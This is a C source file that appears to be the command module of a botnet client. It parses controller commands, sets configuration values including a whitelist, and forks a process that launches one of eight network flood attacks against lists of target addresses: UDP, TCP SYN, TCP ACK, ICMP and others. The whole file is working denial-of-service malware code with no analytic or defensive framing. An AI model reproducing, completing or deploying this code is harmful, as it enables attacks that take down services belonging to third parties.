#include "commands.h"
#include "flood.h"

#include <arpa/inet.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/prctl.h>
#include <sys/types.h>
#include <unistd.h>

extern int config_set(int32_t index, const char *value);

Target g_targets[DRIFTER_MAX_TARGETS];
uint32_t g_target_count = 0;

static size_t commands_split_space(char *text, char *tokens[8], char **last)
{
    size_t count = 0;
    char *token = strtok(text, " ");
    char *keep_going;

    *last = token;
    if (token == NULL) {
        return 0;
    }

    do {
        tokens[count] = token;
        token = strtok(NULL, " ");
        ++count;
        keep_going = token;
        if (count > 7) {
            keep_going = NULL;
        }
        *last = token;
    } while (keep_going != NULL);

    return count;
}

static uint32_t commands_pointer_result(char *pointer)
{
    return (uint32_t)(uintptr_t)pointer;
}

uint32_t commands_process_config(char *text)
{
    char *tokens[8] = {0};
    char *last = NULL;
    size_t count = commands_split_space(text, tokens, &last);

    if (count == 6 && strcmp(tokens[0], "ud") == 0) {
        (void)config_set(0x36, tokens[1]);
        (void)config_set(0x37, tokens[2]);
        (void)config_set(0x38, tokens[3]);
        (void)config_set(0x39, tokens[4]);
        return (uint32_t)config_set(0x3a, tokens[5]);
    }

    if (count == 2 && strcmp(tokens[0], "whitelist") == 0) {
        return (uint32_t)config_set(0x3e, tokens[1]);
    }

    return commands_pointer_result(last);
}

uint32_t commands_parse_targets(char *target_list)
{
    char *token = strtok(target_list, ",");

    while (token != NULL) {
        char *slash = strchr(token, '/');
        int32_t prefix_length;

        if (slash == NULL) {
            prefix_length = 32;
        } else {
            *slash = '\0';
            prefix_length = atoi(slash + 1);
        }

        Target *target = &g_targets[g_target_count];
        strncpy(target->address, token, 15);
        target->prefix_length = prefix_length;
        ++g_target_count;
        target->address[15] = '\0';

        token = strtok(NULL, ",");
    }

    return commands_pointer_result(token);
}

static int32_t command_u8(const char *text)
{
    return (int32_t)(uint8_t)atoi(text);
}

static uint16_t command_u16(const char *text)
{
    return (uint16_t)atoi(text);
}

static int32_t command_target_count(void)
{
    return (int32_t)(uint8_t)g_target_count;
}

uint32_t commands_dispatch(char *text)
{
    char *tokens[8] = {0};
    char *last = NULL;
    size_t count = commands_split_space(text, tokens, &last);

    if (count != 8) {
        return commands_pointer_result(last);
    }

    pid_t child = fork();
    if (child != 0) {
        return (uint32_t)child;
    }

    (void)prctl(PR_SET_PDEATHSIG, SIGKILL, 0, 0, 0);

    const void *payload = tokens[7];
    if (tokens[7][0] == '(') {
        payload = NULL;
    }

    (void)commands_parse_targets(tokens[1]);

    const uint8_t command = (uint8_t)tokens[0][0];
    const int32_t targets = command_target_count();
    const int32_t watchdog = command_u8(tokens[2]);
    const int32_t packet_delay = atoi(tokens[6]);

    switch (command) {
    case '0':
        (void)flood_udp_bytes(g_targets, targets, watchdog,
                              command_u16(tokens[3]), command_u16(tokens[4]),
                              command_u16(tokens[5]), packet_delay, payload);
        break;

    case '1': {
        const uint32_t destination_port = command_u16(tokens[3]);
        const uint16_t source_port = command_u16(tokens[4]);
        (void)command_u16(tokens[5]);
        (void)flood_tcp_syn(g_targets, targets, watchdog, destination_port,
                            source_port, packet_delay);
        break;
    }

    case '2':
        (void)flood_tcp_push_ack(g_targets, targets, watchdog,
                                 command_u16(tokens[3]), command_u16(tokens[4]),
                                 command_u16(tokens[5]), packet_delay, payload);
        break;

    case '3':
        (void)command_u16(tokens[4]);
        (void)flood_icmp_echo(g_targets, targets, watchdog,
                              command_u16(tokens[3]), command_u16(tokens[5]),
                              packet_delay, payload);
        break;

    case '4': {
        const int32_t unused_source_port = atoi(tokens[4]);
        (void)unused_source_port;
        flood_tcp_connect(tokens[1], watchdog, command_u16(tokens[3]),
                          command_u16(tokens[5]), packet_delay, payload);
        break;
    }

    case '5':
        (void)flood_udp_hex(g_targets, targets, watchdog,
                            command_u16(tokens[3]), command_u16(tokens[4]),
                            command_u16(tokens[5]), packet_delay, payload);
        break;

    case '6':
        (void)flood_tcp_ack(g_targets, targets, watchdog,
                            command_u16(tokens[3]), command_u16(tokens[4]),
                            command_u16(tokens[5]), packet_delay, payload);
        break;

    case '7':
        (void)flood_udp_raw(g_targets, targets, watchdog,
                            command_u16(tokens[3]), command_u16(tokens[4]),
                            command_u16(tokens[5]), packet_delay, payload);
        break;

    default:
        break;
    }

    for (;;) {
        exit(0);
    }
}
